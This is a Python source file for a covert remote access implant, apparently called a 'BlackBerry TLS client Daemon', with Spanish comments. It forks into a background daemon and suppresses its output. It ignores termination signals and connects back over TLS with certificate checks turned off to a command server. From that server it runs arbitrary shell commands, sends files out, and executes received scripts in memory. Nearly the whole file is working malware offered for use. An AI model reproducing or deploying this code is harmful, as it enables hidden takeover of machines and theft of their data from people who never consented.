#!/usr/bin/env python3
# BlackBerry TLS client Daemon
import socket, ssl, struct, sys, os, time, threading, getpass, subprocess, hashlib, signal, zlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

# ==================== CONFIGURACIÓN ====================
SERVER_HOST = "localhost"
SERVER_PORT = 9948
TLS_INSECURE = True

# Verificación de fingerprint (deshabilitada por defecto)
ENABLE_FINGERPRINT_VERIFICATION = False
EXPECTED_FINGERPRINT = ""

# ==================== CONFIGURACIÓN TÉCNICA ====================
ENABLE_COMPRESSION = True
COMPRESSION_LEVEL = 9
HEARTBEAT_INTERVAL = 160
RECV_TIMEOUT = 180
AES_KEY_BYTES = 32
MAX_OUTPUT_SIZE = 1024 * 1024 * 10
CHUNK_SIZE = 64 * 1024
PUBKEY_READ_LIMIT = 16384
RECONNECT_DELAY = 30

# Variables globales
client_running = True

# ==================== MODO SIGILOSO ====================
class SilentMode:
    def write(self, x): pass
    def flush(self): pass

def enable_stealth():
    """Activa modo sigiloso total"""
    sys.stdout = SilentMode()
    sys.stderr = SilentMode()
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    try:
        os.chdir("/tmp")
    except:
        pass

def daemonize():
    """Convierte el proceso en daemon"""
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        pass
    os.setsid()
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        pass
    sys.stdout.flush()
    sys.stderr.flush()
    with open(os.devnull, 'r') as dev_null:
        os.dup2(dev_null.fileno(), sys.stdin.fileno())
    with open(os.devnull, 'a+') as dev_null:
        os.dup2(dev_null.fileno(), sys.stdout.fileno())
    with open(os.devnull, 'a+') as dev_null:
        os.dup2(dev_null.fileno(), sys.stderr.fileno())

def verify_server_fingerprint(server_pubkey_pem):
    """Verifica el fingerprint del servidor"""
    if not ENABLE_FINGERPRINT_VERIFICATION:
        return True
    try:
        pem_data = server_pubkey_pem if isinstance(server_pubkey_pem, bytes) else server_pubkey_pem.encode('utf-8')
        public_key = serialization.load_pem_public_key(pem_data)
        der_bytes = public_key.public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        actual_fingerprint = hashlib.sha256(der_bytes).hexdigest()
        formatted_fp = ':'.join(actual_fingerprint[i:i+2] for i in range(0, len(actual_fingerprint), 2))
        return formatted_fp == EXPECTED_FINGERPRINT
    except:
        return False

# ==================== FUNCIONES TLS ====================
def create_tls_context():
    """Crea contexto TLS"""
    context = ssl.create_default_context()
    if TLS_INSECURE:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_3
    return context

def recvall(sock, n, timeout=30):
    """Recibe exactamente n bytes"""
    data = b''
    sock.settimeout(timeout)
    try:
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
    except:
        return None
    return data

def send_encrypted_message(sock, plaintext, key, timeout=30):
    """Envía mensaje cifrado con compresión opcional"""
    try:
        plaintext_bytes = plaintext.encode('utf-8', errors='replace') if isinstance(plaintext, str) else plaintext
        flag = 0
        payload = plaintext_bytes
        
        if ENABLE_COMPRESSION and len(plaintext_bytes) > 100:
            try:
                compressed = zlib.compress(plaintext_bytes, level=COMPRESSION_LEVEL)
                if len(compressed) < len(plaintext_bytes):
                    payload = compressed
                    flag = 1
            except:
                pass
        
        aesgcm = AESGCM(key)
        nonce = os.urandom(12)
        ct = aesgcm.encrypt(nonce, payload, None)
        message = bytes([flag]) + nonce + ct
        full_packet = struct.pack('!I', len(message)) + message
        
        sock.settimeout(timeout)
        sock.sendall(full_packet)
        return True
    except:
        return False

def receive_encrypted_message(sock, key, timeout=30):
    """Recibe y descifra mensaje"""
    try:
        raw_len = recvall(sock, 4, timeout)
        if not raw_len or len(raw_len) < 4:
            return None
        
        msg_len = struct.unpack('!I', raw_len)[0]
        if msg_len <= 0 or msg_len > MAX_OUTPUT_SIZE:
            return None
        
        data = recvall(sock, msg_len, timeout)
        if not data or len(data) < 13:
            return None
        
        flag = data[0]
        nonce = data[1:13]
        ciphertext = data[13:]
        
        aesgcm = AESGCM(key)
        plaintext_bytes = aesgcm.decrypt(nonce, ciphertext, None)
        
        if flag == 1:
            try:
                plaintext_bytes = zlib.decompress(plaintext_bytes)
            except:
                return None
        
        try:
            return plaintext_bytes.decode('utf-8')
        except:
            return plaintext_bytes.decode('utf-8', errors='replace')
    except:
        return None

def send_file_to_server(sock, aes_key, file_path):
    """Envía archivo al servidor"""
    try:
        if not os.path.isfile(file_path):
            return False
        
        file_size = os.path.getsize(file_path)
        sha = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(CHUNK_SIZE), b''):
                sha.update(chunk)
        file_hash = sha.hexdigest()
        
        if not send_encrypted_message(sock, f"SIZE {file_size} {file_hash}", aes_key):
            return False
        
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                
                flag = 0
                payload = chunk
                if ENABLE_COMPRESSION:
                    try:
                        compressed = zlib.compress(chunk, level=COMPRESSION_LEVEL)
                        if len(compressed) < len(chunk):
                            payload = compressed
                            flag = 1
                    except:
                        pass
                
                aesgcm = AESGCM(aes_key)
                nonce = os.urandom(12)
                ct = aesgcm.encrypt(nonce, payload, None)
                message = bytes([flag]) + nonce + ct
                sock.sendall(struct.pack('!I', len(message)) + message)
        
        return True
    except:
        return False

def execute_in_memory(file_bytes, file_name="<received>"):
    """Ejecuta código desde memoria sin tocar disco"""
    ext = os.path.splitext(file_name)[1].lower()
    interpreters = {
        ".py": ["python3", "-c"],
        ".sh": ["bash", "-c"],
        ".pl": ["perl", "-e"],
        ".rb": ["ruby", "-e"]
    }
    
    interpreter_cmd = interpreters.get(ext, ["bash", "-c"])
    
    try:
        code_str = file_bytes.decode('utf-8', errors='replace')
        proc = subprocess.run(
            interpreter_cmd + [code_str],
            capture_output=True,
            timeout=60,
            text=True
        )
        out = (proc.stdout + proc.stderr).strip()
        if not out:
            out = f"[Ejecutado. Código: {proc.returncode}]"
        return True, out
    except FileNotFoundError:
        return False, f"[ERROR] Intérprete no encontrado: {interpreter_cmd[0]}"
    except subprocess.TimeoutExpired:
        return False, "[ERROR] Timeout (60s)"
    except Exception as e:
        return False, f"[ERROR] Fallo en ejecución: {e}"

def handle_incoming_file(header_msg, sock, aes_key):
    """Maneja recepción de archivo del servidor - IGUAL QUE CLIENTE SIN TLS"""
    try:
        parts = header_msg.split()
        if len(parts) != 3 or parts[0] != "SIZE":
            return
        
        file_size = int(parts[1])
        expected_hash = parts[2]
        
        file_data = b''
        sha = hashlib.sha256()
        
        while len(file_data) < file_size:
            raw_len = recvall(sock, 4, timeout=60)
            if not raw_len:
                return
            
            packet_len = struct.unpack('!I', raw_len)[0]
            packet = recvall(sock, packet_len, timeout=60)
            if not packet or len(packet) < 13:
                return
            
            flag = packet[0]
            nonce = packet[1:13]
            ct = packet[13:]
            
            aesgcm = AESGCM(aes_key)
            chunk = aesgcm.decrypt(nonce, ct, None)
            
            if flag == 1:
                chunk = zlib.decompress(chunk)
            
            file_data += chunk
            sha.update(chunk)
        
        if sha.hexdigest() != expected_hash:
            send_encrypted_message(sock, "[ERROR] Fallo de integridad", aes_key)
            return
        
        # Esperar comando PUT_FILE
        final_command_str = receive_encrypted_message(sock, aes_key, timeout=30)
        if not final_command_str or not final_command_str.startswith("PUT_FILE"):
            return
        
        parts = final_command_str.split()
        if len(parts) < 2:
            return
        
        file_name = parts[1]
        execute = "-exc" in parts
        
        response_msg = ""
        
        if execute:
            # EJECUTAR EN MEMORIA
            success, out = execute_in_memory(file_data, file_name)
            if success:
                response_msg = f"[SUCCESS] '{file_name}' ejecutado:\n{out}"
            else:
                response_msg = f"[ERROR] Fallo: {out}"
        else:
            # GUARDAR EN DISCO
            try:
                save_path = os.path.basename(file_name)
                with open(save_path, "wb") as f:
                    f.write(file_data)
                response_msg = f"[SUCCESS] Archivo '{save_path}' guardado"
            except Exception as e:
                response_msg = f"[ERROR] No se pudo guardar: {e}"
        
        send_encrypted_message(sock, response_msg, aes_key)
    except:
        pass

def heartbeat_sender(sock, aes_key, stop_evt):
    """Envía heartbeats periódicos"""
    global client_running
    while not stop_evt.is_set() and client_running:
        if not send_encrypted_message(sock, "HEARTBEAT", aes_key, timeout=5):
            break
        stop_evt.wait(HEARTBEAT_INTERVAL)

def execute_command(cmd):
    """Ejecuta comando del sistema"""
    try:
        result = subprocess.run(
            cmd, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=30, 
            errors='replace'
        )
        output = result.stdout or ""
        if result.stderr:
            output += ("\n--- STDERR ---\n" + result.stderr) if output else result.stderr
        if not output:
            output = f"[Sin salida. Código: {result.returncode}]"
        if len(output) > MAX_OUTPUT_SIZE:
            output = output[:MAX_OUTPUT_SIZE] + "\n[TRUNCADO]"
        return output
    except subprocess.TimeoutExpired:
        return "[ERROR] Timeout (30s)"
    except Exception as e:
        return f"[ERROR] {e}"

def process_command_and_respond(cmd, sock, aes_key):
    """Procesa comandos del servidor - IGUAL QUE CLIENTE SIN TLS"""
    global client_running
    
    cmd = (cmd or "").strip()
    if not cmd:
        return
    
    # HEARTBEAT
    if cmd == "HEARTBEAT":
        send_encrypted_message(sock, "HEARTBEAT_ACK", aes_key)
        return
    
    if cmd.upper() == "PING":
        send_encrypted_message(sock, "PONG", aes_key)
        return
    
    if cmd == "TERMINATE_SESSION":
        client_running = False
        send_encrypted_message(sock, "SESSION_TERMINATED", aes_key)
        return
    
    # GET_CWD
    if cmd in ("GET_CWD", "pwd"):
        send_encrypted_message(sock, os.getcwd(), aes_key)
        return
    
    # CD
    if cmd.startswith("cd "):
        try:
            target = cmd.split(maxsplit=1)[1].strip()
            os.chdir(target)
            result = f"OK {os.getcwd()}"
        except Exception as e:
            result = f"[ERROR] cd: {e}"
        send_encrypted_message(sock, result, aes_key)
        return
    
    # WHOAMI
    if cmd == "whoami":
        try:
            user = getpass.getuser()
        except:
            user = os.environ.get("USER", "unknown")
        send_encrypted_message(sock, user, aes_key)
        return
    
    # GET_FILE
    if cmd.startswith("GET_FILE "):
        parts = cmd.split(maxsplit=1)
        if len(parts) > 1:
            send_file_to_server(sock, aes_key, parts[1].strip())
        return
    
    # COMANDO GENÉRICO
    output = execute_command(cmd)
    send_encrypted_message(sock, output, aes_key)

def run_client():
    """Bucle principal del cliente - IGUAL QUE CLIENTE SIN TLS"""
    global client_running
    
    while True:
        s = None
        stop_evt = threading.Event()
        try:
            # Generar clave AES
            aes_key = os.urandom(AES_KEY_BYTES)
            
            # Conexión TCP
            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_socket.settimeout(15)
            raw_socket.connect((SERVER_HOST, SERVER_PORT))
            
            # Handshake TLS
            tls_context = create_tls_context()
            s = tls_context.wrap_socket(
                raw_socket, 
                server_hostname=(None if TLS_INSECURE else SERVER_HOST)
            )
            s.settimeout(None)
            
            # Recibir banner
            banner = s.recv(1024)
            
            # Solicitar clave pública
            s.sendall(b"REQUEST_PUBKEY")
            
            # Recibir clave pública
            initial = s.recv(PUBKEY_READ_LIMIT)
            if not initial.startswith(b'PUBKEY:'):
                raise ValueError("Respuesta inválida")
            
            pem = initial[len(b'PUBKEY:'):]
            
            # Recibir resto si es necesario
            if b"END PUBLIC KEY" not in pem:
                s.settimeout(5)
                try:
                    attempts = 0
                    while b"END PUBLIC KEY" not in pem and attempts < 10:
                        more = s.recv(4096)
                        if not more:
                            break
                        pem += more
                        attempts += 1
                except:
                    pass
                s.settimeout(None)
            
            if b"END PUBLIC KEY" not in pem:
                raise ValueError("Clave pública incompleta")
            
            # Verificar fingerprint
            if not verify_server_fingerprint(pem):
                s.close()
                time.sleep(RECONNECT_DELAY)
                continue
            
            # Cargar y cifrar clave AES
            server_pub = serialization.load_pem_public_key(pem)
            encrypted_aes = server_pub.encrypt(
                aes_key, 
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()), 
                    algorithm=hashes.SHA256(), 
                    label=None
                )
            )
            s.sendall(struct.pack('!I', len(encrypted_aes)) + encrypted_aes)
            
            # Iniciar heartbeat
            hb_thread = threading.Thread(
                target=heartbeat_sender, 
                args=(s, aes_key, stop_evt), 
                daemon=True
            )
            hb_thread.start()
            
            # Bucle principal - IGUAL QUE CLIENTE SIN TLS
            while client_running:
                msg_str = receive_encrypted_message(s, aes_key, timeout=(HEARTBEAT_INTERVAL + 20))
                if msg_str is None:
                    break
                
                # Detectar transferencia de archivo
                if msg_str.startswith("SIZE "):
                    handle_incoming_file(msg_str, s, aes_key)
                elif msg_str != "HEARTBEAT_ACK":
                    process_command_and_respond(msg_str, s, aes_key)
        
        except:
            pass
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass
            stop_evt.set()
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    if os.name == 'posix':
        daemonize()
    
    enable_stealth()
    run_client()